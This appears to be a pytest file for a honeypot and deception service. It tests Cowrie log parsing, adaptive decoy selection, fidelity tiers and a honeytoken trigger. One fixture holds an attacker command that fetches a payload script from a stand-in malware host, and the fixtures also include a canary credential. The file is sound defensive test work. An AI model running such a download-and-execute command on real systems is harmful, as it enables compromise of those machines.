import json
import pytest
from app.db.session import SessionLocal
from app.models.deception import Honeytoken, DecoySession
from app.models.threat import Threat
from app.services.cowrie import CowrieParser, check_cowrie_health
from app.services.deception import DeceptionEngine


def test_cowrie_log_parser_and_schema_mapping():
    parser = CowrieParser()
    sample_login = json.dumps({
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-09-28T12:00:00.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "username": "root",
        "password": "toor_password",
        "message": "login attempt [root/toor_password] failed",
    })
    sample_cmd = json.dumps({
        "eventid": "cowrie.command.input",
        "timestamp": "2026-09-28T12:00:05.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "input": "wget http://malware.site/payload.sh",
        "message": "CMD: wget http://malware.site/payload.sh",
    })

    # Test login event parsing
    p_login = parser.parse_line(sample_login)
    assert p_login is not None
    assert p_login["raw_eventid"] == "cowrie.login.failed"
    assert p_login["src_ip"] == "198.51.100.42"
    assert p_login["username"] == "root"
    assert p_login["password"] == "toor_password"
    assert p_login["session_id"] == "a1b2c3d4"
    assert p_login["mitre_technique"] == "T1110"

    # Test command event parsing
    p_cmd = parser.parse_line(sample_cmd)
    assert p_cmd is not None
    assert p_cmd["raw_eventid"] == "cowrie.command.input"
    assert p_cmd["command"] == "wget http://malware.site/payload.sh"
    assert p_cmd["session_id"] == "a1b2c3d4"
    assert p_cmd["mitre_technique"] == "T1059"


def test_cowrie_truthful_health_check():
    health = check_cowrie_health()
    assert "status" in health
    assert health["status"] in ("HEALTHY", "UNAVAILABLE", "DEGRADED")
    assert "mode" in health


def test_adaptive_decoy_selection_logic():
    db = SessionLocal()
    try:
        engine = DeceptionEngine(db)
        # 1. High risk + Brute Force / Credential Access -> HIGH fidelity fake terminal / SSH honeypot
        d1 = engine.select_adaptive_decoy(
            risk_score=85,
            mitre_technique="T1110",
            event_type="failed_login",
        )
        assert d1.fidelity == "HIGH"
        assert d1.decoy_type in ("ssh_honeypot", "fake_terminal", "bastion_host", "ssh", "admin_panel")
        assert d1.confidence >= 0.85

        # 2. Medium risk -> MEDIUM fidelity
        d2 = engine.select_adaptive_decoy(
            risk_score=65,
            mitre_technique=None,
            event_type="file_access",
        )
        assert d2.fidelity == "MEDIUM"

        # 3. Low risk -> LOW fidelity
        d3 = engine.select_adaptive_decoy(
            risk_score=20,
            mitre_technique=None,
            event_type="routine_read",
        )
        assert d3.fidelity == "LOW"
    finally:
        db.close()


def test_multi_tier_fidelity_attributes():
    db = SessionLocal()
    try:
        engine = DeceptionEngine(db)
        s_low = engine.open_decoy(actor="test_low", source_ip="10.0.0.1", threat_id=None, risk_score=20)
        s_med = engine.open_decoy(actor="test_med", source_ip="10.0.0.2", threat_id=None, risk_score=65)
        s_high = engine.open_decoy(actor="test_high", source_ip="10.0.0.3", threat_id=None, risk_score=90, mitre_technique="T1110")

        assert s_low.fidelity == "LOW"
        assert s_med.fidelity == "MEDIUM"
        assert s_high.fidelity == "HIGH"

        status = engine.fidelity_status()
        assert status["high_fidelity_count"] >= 1
        assert status["medium_fidelity_count"] >= 1
        assert status["low_fidelity_count"] >= 1
    finally:
        db.close()


def test_honeytoken_trigger_lifecycle():
    db = SessionLocal()
    try:
        engine = DeceptionEngine(db)
        # Create a test honeytoken
        token = Honeytoken(
            label="AWS_SECRET_KEY_PROD",
            token_type="api_key",
            planted_on="/root/.aws/credentials",
            value="AKIA_TEST_CANARY_STRING_XYZ",
            triggered=0,
        )
        db.add(token)
        db.commit()
        db.refresh(token)

        # Trigger honeytoken lifecycle
        res = engine.trigger_honeytoken_lifecycle(
            token_id_or_value=token.id,
            actor="attacker_eve",
            source_ip="203.0.113.88",
        )

        assert res is not None
        assert res["token"]["label"] == "AWS_SECRET_KEY_PROD"
        assert "CRITICAL" in res["alert"]
        assert res["escalated_risk"] == 95.0
        assert res["decoy_session_id"] is not None

        # Verify DB states
        db.refresh(token)
        assert token.triggered == 1
        assert token.triggered_by == "attacker_eve"

        # Verify Decoy session created
        decoy = db.query(DecoySession).filter(DecoySession.id == res["decoy_session_id"]).first()
        assert decoy is not None
        assert decoy.fidelity == "HIGH"
        assert decoy.actor == "attacker_eve"
    finally:
        db.close()
